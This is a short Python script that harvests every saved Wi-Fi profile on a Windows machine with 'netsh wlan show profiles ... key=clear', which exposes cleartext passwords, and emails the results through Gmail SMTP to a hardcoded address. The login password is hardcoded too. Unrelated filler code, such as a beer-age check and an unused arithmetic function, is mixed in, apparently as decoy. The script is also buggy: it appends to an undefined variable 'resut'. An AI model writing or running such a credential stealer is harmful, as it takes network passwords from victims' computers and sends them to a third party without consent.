import subprocess, re, smtplib, os

def send_email(mail, password, message):
    host = smtplib.SMTP("smtp.gmail.com", 587)
    host.starttls()
    host.login(mail,password)
    host.sendmail(mail,mail,message)
    host.quit()

def amount(x,y, sum):
    sum = x + y
    sum = sum - 5
    return sum

DEVNULL = open(os.devnull, 'wb')

c1  = "netsh wlan show profiles"
sub1 = subprocess.check_output(c1, shell=True)
regular_list = re.findall("(?:Benutzer\s:\s)(.*)",sub1)

age = 24
if (age > 18):
    answer = "u are allowed to buy beer"
else: answer = "u are a kid, u cannot buy beer"

result = ""

for regular in regular_list:
    c2 = "netsh wlan show profiles " + regular + " key=clear"
    sub2 = subprocess.check_output(c2, shell=True)
    current_value = sub2
    resut = resut + current_value

send_email("shakacrypt@gmail.com", "nrain2339222", resut)